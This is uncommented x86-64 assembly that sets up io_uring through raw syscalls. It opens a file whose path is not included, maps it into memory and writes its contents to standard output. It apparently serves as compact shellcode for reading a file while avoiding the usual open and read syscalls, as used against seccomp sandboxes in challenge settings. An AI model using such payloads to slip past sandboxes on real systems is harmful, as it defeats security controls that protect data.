lea    rax,[rip+0x3f9-7]
xor    edx,edx
push   0x1
pop    rdi
movq   xmm2,rax
sub    rsp,0x108
lea    rbx,[rsp+0x20]
lea    rbp,[rsp+0x40]
movq   xmm0,rbx
push   rbp
pop    rsi
lea    r12,[rsp+0x18]
punpcklqdq xmm0,xmm2
movaps XMMWORD PTR [rsp],xmm0
sub    rsp,0x88
push   rdx
pop    r9
push   rdi
pop    r8
push   0xf
pop    rcx
xor    eax,eax
push   rsp
pop    rdx
push   rdx
pop    rdi
rep stos QWORD PTR es:[rdi],rax
push   r8
pop    rdi
push   r12
push   rbp
push   rdx
pop    rbp
push   rbx
mov    rbx,rsi
mov    rsi,rdx
sub    rsp,0x10
mov    esi,edi
push   0x1a9
pop    rdi
call   syscall_func
pop    r15
lea    rdi,[rbx+0x8]
mov    r12d,eax
and    rdi,0xfffffffffffffff8
mov    QWORD PTR [rbx],0x0
mov    rdx,rbx
mov    QWORD PTR [rbx+0xd0],0x0
mov    ecx, 26
rep stos QWORD PTR es:[rdi],rax
lea    rcx,[rbx+0x68]
mov    edi,r12d
mov    r13d,edi
push   r12
mov    r12,rcx
push   rbp
mov    rbp,rdx
push   rbx
mov    rbx,rsi
push   r15
mov    edx,DWORD PTR [rsi]
mov    eax,DWORD PTR [rsi+0x40]
mov    esi,DWORD PTR [rsi+0x4]
lea    rax,[rax+rdx*4]
mov    edx,DWORD PTR [rbx+0x64]
shl    rsi,0x4
mov    QWORD PTR [rbp+0x48],rax
add    rsi,rdx
mov    QWORD PTR [rcx+0x38],rsi
mov    rsi,QWORD PTR [rbp+0x48]
mov    QWORD PTR [r12+0x38],rsi
mov    r8d,r13d
push   0x8001
pop    rcx
push   0x3
pop    rdx
xor    edi,edi
call   mmap64_func
mov    QWORD PTR [rbp+0x50],rax
mov    QWORD PTR [r12+0x40],rax
mov    edx,DWORD PTR [rbx+0x28]
mov    esi,DWORD PTR [rbx]
mov    r9d,0x10000000
mov    r8d,r13d
push   0x8001
pop    rcx
shl    rsi,0x6
push   0
pop    r15
loop1:
    add    rdx,rax
    mov    QWORD PTR [rbp+r15*8],rdx
    mov    edx,DWORD PTR [rbx+0x2c+r15*4]
    inc    r15
    cmp    r15, 6
    jnz loop1
add    rax,rdx
push   0x3
pop    rdx
mov    QWORD PTR [rbp+0x30],rax
call   mmap64_func
mov    QWORD PTR [rbp+0x38],rax
mov    edx,DWORD PTR [rbx+0x50]
mov    rax,QWORD PTR [r12+0x40]
push   0
pop    r13
push   0
pop    r15
loop2:
    add    rdx,rax
    mov    QWORD PTR [r12+r15*8],rdx
    mov    edx,DWORD PTR [rbx+0x54+r15*4]
    inc    r15
    cmp    r15, 4
    jnz loop2
add    rdx,rax
mov    QWORD PTR [r12+0x28],rdx
mov    edx,DWORD PTR [rbx+0x64]
add    rdx,rax
mov    QWORD PTR [r12+0x30],rdx
mov    edx,DWORD PTR [rbx+0x68]
add    rax,rdx
mov    QWORD PTR [r12+0x20],rax
pop    r15
pop    rbx
pop    rbp
pop    r12
mov    r13d,eax
mov    eax,DWORD PTR [rbp+0x8]
mov    DWORD PTR [rbx+0xc4],r12d
mov    DWORD PTR [rbx+0xc0],eax
mov    eax,DWORD PTR [rbp+0x14]
mov    DWORD PTR [rbx+0xc8],eax
pop    r15
pop    rbx
pop    rbp
pop    r12
add    rsp,0x88
push   rbp
pop    rdi
call   io_uring_get_sqe_func
pxor   xmm1,xmm1
movdqa xmm0,XMMWORD PTR [rsp]
movabs rcx,0xffffffff0000001c
movaps XMMWORD PTR [rsp+0x20],xmm1
mov    QWORD PTR [rsp+0x30],0x0
mov    QWORD PTR [rax],rcx
mov    QWORD PTR [rax+0x18],0x18
mov    QWORD PTR [rax+0x20],0x0
mov    QWORD PTR [rax+0x28],0x0
movups XMMWORD PTR [rax+0x8],xmm0
pxor   xmm0,xmm0
movups XMMWORD PTR [rax+0x30],xmm0
call   io_uring_submit_func
xor    edx,edx
mov    ecx,0x1
mov    rsi,r12
mov    rdi,rbp
call   __io_uring_get_cqe_func
mov    rax,QWORD PTR [rsp+0x18]
xor    r9d,r9d
xor    edi,edi
mov    rdx,QWORD PTR [rsp+0xa8]
mov    ecx,0x2
mov    esi,0x30
mov    r8d,DWORD PTR [rax+0x8]
mov    eax,DWORD PTR [rdx]
add    eax,0x1
mov    DWORD PTR [rdx],eax
mov    edx,0x3
call   mmap64_func
mov    rdi,rbp
mov    QWORD PTR [rsp+0x28],0x40
mov    QWORD PTR [rsp+0x20],rax
call   io_uring_get_sqe_func
pxor   xmm0,xmm0
mov    rdi,rbp
movabs rsi,0x100000002
mov    QWORD PTR [rax],rsi
mov    QWORD PTR [rax+0x8],0x0
mov    QWORD PTR [rax+0x10],rbx
mov    QWORD PTR [rax+0x18],0x1
mov    QWORD PTR [rax+0x20],0x0
mov    QWORD PTR [rax+0x28],0x0
movups XMMWORD PTR [rax+0x30],xmm0
call   io_uring_submit_func
xor    r8d,r8d
xor    edx,edx
mov    ecx,0x1
mov    rsi,r12
mov    rdi,rbp
call   __io_uring_get_cqe_func
io_uring_get_sqe_func:
mov    rax,QWORD PTR [rdi]
xor    r8d,r8d
mov    ecx,DWORD PTR [rax]
mov    eax,DWORD PTR [rdi+0x44]
lea    edx,[rax+0x1]
mov    esi,edx
sub    esi,ecx
mov    rcx,QWORD PTR [rdi+0x18]
mov    rcx,QWORD PTR [rdi+0x10]
and    eax,DWORD PTR [rcx]
mov    DWORD PTR [rdi+0x44],edx
shl    rax,0x6
add    rax,QWORD PTR [rdi+0x38]
mov    r8,rax
mov    rax,r8
ret
io_uring_submit_func:
push   r15
mov    r10,QWORD PTR [rdi+0x8]
mov    edx,DWORD PTR [rdi+0x40]
mov    r8d,DWORD PTR [rdi+0x44]
mov    eax,DWORD PTR [r10]
sub    r8d,edx
mov    rcx,QWORD PTR [rdi+0x10]
mov    r9,QWORD PTR [rdi+0x30]
add    r8d,eax
mov    ecx,DWORD PTR [rcx]
nop    DWORD PTR [rax+0x0]
mov    esi,eax
and    edx,ecx
add    eax,0x1
and    esi,ecx
mov    DWORD PTR [r9+rsi*4],edx
mov    edx,DWORD PTR [rdi+0x40]
add    edx,0x1
mov    DWORD PTR [rdi+0x40],edx
mov    DWORD PTR [r10],eax
mov    rdx,QWORD PTR [rdi]
sub    eax,DWORD PTR [rdx]
xor    edx,edx
mov    esi,eax
mov    eax,DWORD PTR [rdi+0xc0]
mov    ecx,eax
and    ecx,0x2
mov    r8d,ecx
or     r8d,0x1
test   al,0x1
cmovne ecx,r8d
mov    edi,DWORD PTR [rdi+0xc4]
mov    r9,r8
mov    r8d,ecx
mov    ecx,edx
mov    edx,esi
mov    esi,edi
mov    edi,0x1aa
push   r15
push   0x8
call   syscall_func
pop    rdx
pop    rcx
pop    r15
ret
syscall_func:
mov    rax,rdi
mov    rdi,rsi
mov    rsi,rdx
mov    rdx,rcx
mov    r10,r8
mov    r8,r9
mov    r9,QWORD PTR [rsp+0x8]
syscall
ret
__io_uring_get_cqe_func:
sub    rsp,0x28
mov    DWORD PTR [rsp],edx
mov    rdx,rsp
movabs rax,0x800000000
mov    DWORD PTR [rsp+0x4],ecx
mov    QWORD PTR [rsp+0x8],rax
mov    QWORD PTR [rsp+0x10],r8
push   r13
mov    r13,rsi
push   r12
mov    r12,rdx
push   rbp
mov    rbp,rdi
push   rbx
push   r15
nop    DWORD PTR [rax+rax*1+0x0]
mov    rax,QWORD PTR [rbp+0x78]
mov    esi,DWORD PTR [rax]
mov    rax,QWORD PTR [rbp+0x70]
mov    edx,DWORD PTR [rax]
mov    rcx,QWORD PTR [rbp+0x68]
mov    eax,DWORD PTR [rcx]
sub    edx,eax
mov    ebx,esi
and    ebx,eax
shl    rbx,0x4
add    rbx,QWORD PTR [rbp+0x98]
mov    esi,DWORD PTR [r12]
xor    r8d,r8d
mov    QWORD PTR [r13+0x0],rbx
add    rsp,0x8
mov    eax,r8d
pop    rbx
pop    rbp
pop    r12
pop    r13
add    rsp,0x28
ret
mmap64_func:
mov    r10d,ecx
push   0x9
pop    rax
syscall
ret
// debug_func:
// push rdi
// push rsi
// push rdx
// push rax
// sub rsp, 0x8
// mov [rsp], rax
// mov rsi, rsp
// push 1
// pop rdi
// push 8
// pop rdx
// push 1
// pop rax
// add rsp, 0x8
// pop rax
// pop rdx
// pop rsi
// pop rdi

